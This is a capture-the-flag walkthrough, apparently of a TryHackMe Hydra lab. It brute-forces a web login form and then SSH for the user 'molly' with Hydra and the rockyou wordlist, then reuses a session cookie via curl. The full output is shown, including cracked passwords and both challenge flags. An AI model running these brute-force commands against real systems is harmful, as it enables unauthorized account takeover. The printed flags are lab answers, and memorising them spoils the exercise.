# 10.201.106.187

hydra -l <username> -P <wordlist> 10.201.106.187 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.106.187 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

![](https://velog.velcdn.com/images/agnusdei1207/post/b6adca47-7371-4867-aec6-80b0e34434f0/image.png)

──(root㉿docker-desktop)-[/]
└─# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.106.187 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-25 15:00:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.201.106.187:80/login:username=^USER^&password=^PASS^:Your username or password is incorrect.
[80][http-post-form] host: 10.201.106.187 login: molly password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-25 15:00:43

# curl -X POST http://10.201.106.187/login -d "username=molly&password=sunshine" -L -c -v cookies.txt

┌──(root㉿docker-desktop)-[/]
└─# curl -X POST http://10.201.106.187/login -d "username=molly&password=sunshine" -L -c -v cookies.txt
Note: Unnecessary use of -X or --request, POST is already inferred.

- Trying 10.201.106.187:80...
- Connected to 10.201.106.187 (10.201.106.187) port 80
- using HTTP/1.x
  > POST /login HTTP/1.1
  > Host: 10.201.106.187
  > User-Agent: curl/8.15.0
  > Accept: _/_
  > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
  > Content-Length: 32
  > Content-Type: application/x-www-form-urlencoded
- upload completely sent off: 32 bytes
  < HTTP/1.1 302 Found
  < X-Powered-By: Express
- Need to rewind upload for next request
  < Location: /
  < Vary: Accept
  < Content-Type: text/plain; charset=utf-8
  < Content-Length: 23
  < Date: Thu, 25 Sep 2025 15:04:18 GMT
  < Connection: keep-alive
- Ignoring the response-body
- setting size while ignoring
  <
- Connection #0 to host 10.201.106.187 left intact
- Issue another request to this URL: 'http://10.201.106.187/'
- Stick to POST instead of GET
- Re-using existing http: connection with host 10.201.106.187
  > POST / HTTP/1.1
  > Host: 10.201.106.187
  > User-Agent: curl/8.15.0
  > Accept: _/_
  > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
- Request completely sent off
  < HTTP/1.1 404 Not Found
  < X-Powered-By: Express
  < Content-Security-Policy: default-src 'none'
  < X-Content-Type-Options: nosniff
  < Content-Type: text/html; charset=utf-8
  < Content-Length: 140
  < Date: Thu, 25 Sep 2025 15:04:19 GMT
  < Connection: keep-alive
  <
  <!DOCTYPE html>
  <html lang="en">
  <head>
  <meta charset="utf-8">
  <title>Error</title>
  </head>
  <body>
  <pre>Cannot POST /</pre>
  </body>
  </html>
- Connection #0 to host 10.201.106.187 left intact

# 쿠키 확보 -> connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA

# cat cookie.txt

# curl http://10.201.106.187/ -b "connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA" -v

# curl http://10.201.106.187 -b cookies.txt -v

┌──(root㉿docker-desktop)-[/]
└─# curl http://10.201.106.187 -b cookies.txt -v

- Trying 10.201.106.187:80...
- Connected to 10.201.106.187 (10.201.106.187) port 80
- using HTTP/1.x
  > GET / HTTP/1.1
  > Host: 10.201.106.187
  > User-Agent: curl/8.15.0
  > Accept: _/_
  > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
- Request completely sent off
  < HTTP/1.1 200 OK
  < X-Powered-By: Express
  < Content-Type: text/html; charset=utf-8
  < Content-Length: 856
  < ETag: W/"358-ZUlnMFSQKTY8/4+sv52YQFGK7I4"
  < Date: Thu, 25 Sep 2025 15:06:38 GMT
  < Connection: keep-alive
  <
  <!doctype html>
  <html lang="en">
    <head>
      <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <title>Hydra Challenge</title>

    </head>
    <style>
      .jumbotron {
        background-image: url(/img/background.jpg);
        color: white;
        object-fit: cover;
        height: 100vh;
        margin: 0;
        border-radius: 0;
      }
      h1 {
        position: absolute;
        left: 50px;
        top: 50px;
        font-weight: bold;
        font-size: 50px;
      }
    </style>
    <body>

      <div class="jumbotron text-center">
        <h1>THM{2673a7dd116de68e85c48ec0b1f2612e}</h1>
      </div>

      <script src="/js/jquery.slim.min.js"></script>
      <script src="/js/popper.min.js"></script>
      <script src="/js/bootstrap.min.js"></script>

    </body>
  </html>

- Connection #0 to host 10.201.106.187 left intact

> hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.106.187 -t 4
> hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.106.187 -t 4 ssh

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-26 15:23:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.201.106.187:22/
[22][ssh] host: 10.201.106.187 login: molly password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-26 15:23:37

![](https://velog.velcdn.com/images/agnusdei1207/post/5f8f9b50-2ea5-4c89-803c-36876f8de76c/image.png)

> ssh molly@10.201.106.187

┌──(root㉿docker-desktop)-[/]
└─# ssh molly@10.201.106.187
The authenticity of host '10.201.106.187 (10.201.106.187)' can't be established.
ED25519 key fingerprint is SHA256:o+KrIwA4fu2ZLvn6K+ivm/ebLoxmxWjs3E+vfs2Xvug.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.201.106.187' (ED25519) to the list of known hosts.
molly@10.201.106.187's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)

- Documentation: https://help.ubuntu.com
- Management: https://landscape.canonical.com
- Support: https://ubuntu.com/pro

System information as of Fri 26 Sep 2025 03:28:38 PM UTC

System load: 0.0 Processes: 108
Usage of /: 18.3% of 14.47GB Users logged in: 0
Memory usage: 18% IPv4 address for ens5: 10.201.106.187
Swap usage: 0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

7 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-201-106-187:~$

Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-201-106-187:~$ ls
flag2.txt
molly@ip-10-201-106-187:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
molly@ip-10-201-106-187:~$
